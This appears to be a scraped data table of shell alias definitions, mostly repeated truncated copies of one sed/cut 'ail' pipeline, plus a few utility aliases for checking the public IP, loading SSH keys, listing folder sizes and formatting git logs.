3635501,583419,myip,lynx -dump -hiddenlinks=ignore -nolist http://checkip.dyndns.org:8245/ | awk '{ print \$4 }' | sed '/^$/d; s/^[ ]*//g; s/[ ]*$//g'"""
3635465,583418,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3635429,583417,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3635393,583416,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3635357,583415,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3635321,583414,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3635263,583412,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3635227,583411,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3635191,583410,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3635155,583409,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3635119,583408,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3635083,583407,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3635047,583406,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3635011,583405,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3634975,583404,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3634939,583403,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3634903,583402,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3634867,583400,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3634831,583399,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3634795,583398,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3634759,583397,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3634723,583396,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3634687,583395,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3634651,583394,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3634615,583393,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3634579,583392,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3634543,583391,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3634507,583390,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3634471,583389,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3634435,583388,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3634381,583385,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3634345,583384,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3634309,583383,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3634273,583382,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3634237,583381,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3634183,583377,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3634147,583376,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3634111,583375,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3634075,583374,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3634039,583373,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3634003,583372,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3633967,583371,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3633931,583370,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3633892,583366,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3633856,583365,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3633820,583364,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3633775,583362,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3633739,583361,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3633703,583360,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3633667,583359,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3633613,583357,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3633577,583356,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3633541,583355,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3633505,583354,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3633469,583353,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3633433,583352,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3633397,583351,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3633361,583349,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3633325,583348,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3633289,583347,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3633253,583346,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3633217,583345,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3633181,583343,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3633145,583342,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3633109,583340,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3632996,583336,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3632960,583335,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3632924,583334,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3632888,583333,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3632852,583332,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3632816,583331,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3632780,583330,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3632744,583329,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3632706,583325,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3632670,583324,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3632634,583323,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3632598,583322,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3632562,583321,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3632526,583320,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3632490,583319,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3632408,583316,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3632372,583315,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3632223,583310,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3632187,583309,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3632151,583308,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3632115,583307,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3632079,583306,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3632043,583305,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3632007,583304,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3631971,583301,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3631935,583299,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3631899,583298,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3631863,583297,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3631826,583295,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3631790,583294,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3631754,583293,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3631718,583292,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3631682,583291,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3631646,583290,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3631610,583289,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3631556,583286,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3631520,583285,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3631484,583284,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3631448,583283,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3631411,583281,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3631320,583278,ssh,ssh-add -l >/dev/null || ssh-add && unalias ssh; ssh"""
3631301,583277,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3631265,583275,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3631228,583273,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3631003,583267,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3630965,583264,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3630929,583263,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3630893,583261,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3630839,583259,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3630803,583258,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3630767,583257,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3630731,583255,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3630677,583253,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3630623,583251,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3630587,583250,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3630551,583249,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3630430,583243,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3622042,582370,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3621841,582362,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3621800,582354,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3621718,582343,folders,find . -maxdepth 1 -type d -print0 | xargs -0 du -skh | sort -rn"""
3621512,582331,folders,find . -maxdepth 1 -type d -print0 | xargs -0 du -skh | sort -rn"""
3621465,582320,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3621328,582314,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3621292,582313,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3621256,582312,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3621220,582311,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3621184,582310,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3621148,582308,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3621112,582307,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3621076,582306,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3621039,582304,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3620932,582299,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3620896,582298,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3620858,582295,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3620822,582293,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3620786,582292,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3620750,582291,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3620684,582289,logm,printf '$bldcyn' && git log --pretty=format:'%D' -1 && git log --format=format:'%Creset%Cgreen%h%Creset | %C(white)%an | %C(yellow)%cr%n%Creset%s%n%n%b%n'"""
3620661,582288,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3620625,582287,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3620589,582286,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3620553,582285,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3620517,582284,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3620481,582283,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3620444,582281,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3620408,582280,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3620372,582279,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3620336,582277,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3620300,582276,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3620264,582275,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3620228,582274,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3620192,582273,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3620156,582272,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3620120,582271,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3620084,582270,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3620048,582269,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3620012,582268,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3619976,582267,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3619940,582266,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3619904,582265,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3619868,582264,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3619832,582263,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3619796,582262,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3619760,582261,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3619724,582260,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3619688,582259,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3619652,582258,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3619616,582257,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3619580,582256,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3619544,582255,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3619508,582254,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3619472,582253,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3619436,582252,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3619400,582251,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3619311,582248,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3619275,582247,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3619239,582246,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3619203,582245,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3619167,582244,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3619131,582243,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3619094,582241,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3619058,582240,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3619022,582239,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3618986,582238,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3618950,582237,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3618914,582236,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3618878,582235,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3618842,582234,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3618806,582233,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3618770,582232,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3618734,582231,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3618698,582230,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3618662,582229,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3618626,582228,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3618471,582225,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3618435,582224,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3618399,582223,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3618363,582222,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3618327,582221,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3618291,582220,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3618255,582219,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3618219,582218,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3618183,582217,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3618147,582216,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3618111,582215,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3618075,582214,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3618039,582213,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3618003,582212,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3617967,582211,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3617931,582210,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3617895,582209,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3617859,582208,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3617823,582207,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3617787,582206,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3617751,582205,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3617715,582204,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3617679,582203,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3617643,582202,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3617607,582201,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3617571,582199,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3617535,582198,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3617499,582197,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3617463,582196,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3617427,582195,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3617391,582194,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3617355,582193,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3617319,582192,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3617283,582191,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3617247,582190,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3617211,582189,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3617175,582188,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3617139,582187,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3617103,582186,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3617067,582185,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3617031,582184,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3616995,582183,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3616959,582182,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3616923,582181,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3616887,582180,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3616851,582178,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3616815,582177,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3616779,582176,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3616743,582175,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3616707,582174,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3616671,582173,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3616635,582172,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3616599,582171,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3616563,582170,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3616527,582169,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3616491,582168,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3616455,582167,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3616419,582166,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3616383,582165,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3616347,582164,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3616311,582163,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3616275,582162,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3616239,582161,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3616203,582160,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3616167,582159,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3616131,582158,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3616095,582157,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3616059,582156,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3616023,582155,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3615987,582154,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3615951,582153,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3615915,582152,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3615879,582151,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3615843,582150,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3615807,582149,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3615771,582148,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3615735,582147,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3615699,582146,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3615663,582145,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3615627,582144,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3615591,582143,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3615555,582142,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3615519,582141,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3615483,582140,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3615447,582139,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3615411,582138,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3615375,582137,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3615213,582132,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3615177,582131,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3615141,582130,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3615105,582129,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3615033,582127,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
